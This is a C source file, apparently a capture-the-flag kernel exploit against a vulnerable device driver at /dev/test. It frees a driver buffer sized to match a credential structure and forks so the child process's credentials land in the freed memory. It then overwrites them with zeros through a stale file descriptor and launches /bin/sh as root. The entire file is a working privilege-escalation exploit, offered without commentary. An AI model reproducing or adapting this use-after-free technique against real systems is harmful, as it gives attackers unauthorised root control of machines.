// exp.c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    int fd1 = open("/dev/test", 2);
    int fd2 = open("/dev/test", 2);

    ioctl(fd1, 0, 0xa8);
    close(fd1);

    int pid = fork();

    if (pid < 0) {
        exit(-1);
    } else if (pid == 0) {
        char buf[30] = {0};
        write(fd2, buf, 28);
        system("/bin/sh");
        return 0;
    } else {
        wait(NULL);
    }

    return 0;
}
